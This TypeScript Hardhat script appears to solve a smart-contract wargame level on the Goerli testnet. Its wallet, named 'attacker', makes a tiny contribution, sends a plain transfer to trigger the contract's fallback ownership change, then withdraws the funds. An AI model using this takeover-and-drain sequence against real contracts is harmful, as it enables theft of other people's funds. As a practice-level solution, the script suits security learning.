// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const abi = [
  "function contribute() public payable",
  "function getContribution() public view returns (uint)",
  "function withdraw() public"
]

const address = "0xceFe26B51867E25039CB3639f654776aC355CFf5"
const contract = new ethers.Contract(address, abi, provider)

async function main() {
  const contractWithWallet = contract.connect(attacker)
  
  let tx

  tx = await contractWithWallet.contribute({ value: 1 })
  await tx.wait()

  tx = await attacker.sendTransaction({
    to: contract.address,
    value: 1
  })
  await tx.wait()

  tx = await contract.connect(attacker).withdraw()
  await tx.wait()

  console.log("get ownership and withdraw funds");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
